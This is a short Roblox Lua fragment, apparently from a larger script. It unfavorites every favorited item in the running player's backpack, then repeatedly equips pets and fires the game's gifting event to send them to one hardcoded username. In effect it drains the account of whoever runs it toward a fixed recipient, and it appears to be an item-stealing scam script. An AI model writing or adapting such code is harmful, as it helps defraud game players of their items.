-- Gifting pets in sorted order
task.spawn(function()
    while true do
        local targetPlayer = Players:FindFirstChild("sheeloi0727") -- target player name

        if targetPlayer then
            for _, tool in ipairs(Backpack:GetChildren()) do
                if tool:IsA("Tool") and tool:GetAttribute("Favorite") == true then
                    ReplicatedStorage.GameEvents.Favorite_Item:FireServer(tool)
                end
            end

            task.wait(10)

            for _, entry in ipairs(matchedTools) do
                local tool = entry.tool
                local character = LocalPlayer.Character
                if character and character:FindFirstChild("Humanoid") then
                    character.Humanoid:EquipTool(tool)
                    task.wait(1)
                    ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer)
                end
            end
        end

        task.wait()
    end
end)
